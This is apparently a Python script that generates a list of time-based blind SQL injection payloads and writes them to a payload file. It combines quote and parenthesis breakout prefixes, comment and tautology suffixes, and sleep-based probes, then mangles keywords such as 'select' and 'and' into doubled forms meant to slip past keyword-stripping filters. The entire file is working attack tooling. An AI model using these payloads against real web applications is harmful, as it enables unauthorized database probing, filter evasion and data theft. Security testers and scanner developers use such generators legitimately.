
a = [("and","AnaNdd"),("suBstr","Mid"),("select","SELSEleCtect"),("aScii","aSciaSciii"),("suBstr","subSuBstrstr")]
pre_ = ["' ",'" ',"') "," ","')) ",")' ","))' ",'") ','")) ',')" ','))" ']
stuff_ = ["#","-- ","and('1')='1","and('1')=\"1","and('1')=('1","and('1')=(\"1","and('1')=(('1","and('1')=((\"1","and('1')='(1","and('1')='((1","and('1')=\"((1","and('1')=\"(1"]
payload1 = "and(sleep(if((select(aScii(suBstr('867546938',2,1)))=54),[wait_time],1)))"
payload2 = "and(sleep(if(!(select(aScii(suBstr('867546938',2,1))<>54)),[wait_time],1)))"

with open("../payload/time.txt","a+") as f:
    for pre in pre_:
        for stuff in stuff_:
            f.write('1' + pre+payload1+stuff+ "\n")
            f.write('1' + pre+payload2+stuff + "\n")
            
            #1
            for i in range(len(a)):
                for j in range(i + 1,len(a)):
                    f.write(('1' + pre+payload1+stuff).replace(a[i][0],a[i][1]) + "\n")
                    f.write(('1' + pre+payload2+stuff).replace(a[i][0],a[i][1]) + "\n")
            #2
            for i in range(len(a)):
                for j in range(i + 1,len(a)):
                    f.write(('1' + pre+payload1+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]) + "\n")
                    f.write(('1' + pre+payload2+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]) + "\n")

            #3
            for i in range(len(a)):
                for j in range(i+1,len(a)):
                    for k in range(j+1,len(a)):
                        f.write(('1' + pre+payload1+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]) + "\n")
                        f.write(('1' + pre+payload2+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]) + "\n")
            
            #4
            for i in range(len(a)):
                for j in range(i+1,len(a)):
                    for k in range(j+1,len(a)):
                        for l in range(k+1,len(a)):
                            f.write(('1' + pre+payload1+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]) + "\n")
                            f.write(('1' + pre+payload2+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]) + "\n")
                            

            #5
            for i in range(len(a)):
                for j in range(i+1,len(a)):
                    for k in range(j+1,len(a)):
                        for l in range(k+1,len(a)):
                            for m in range(l+1,len(a)):
                                f.write(('1' + pre+payload1+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]).replace(a[m][0],a[m][1]) + "\n")
                                f.write(('1' + pre+payload2+stuff).replace(a[i][0],a[i][1]).replace(a[j][0],a[j][1]).replace(a[k][0],a[k][1]).replace(a[l][0],a[l][1]).replace(a[m][0],a[m][1]) + "\n")
                                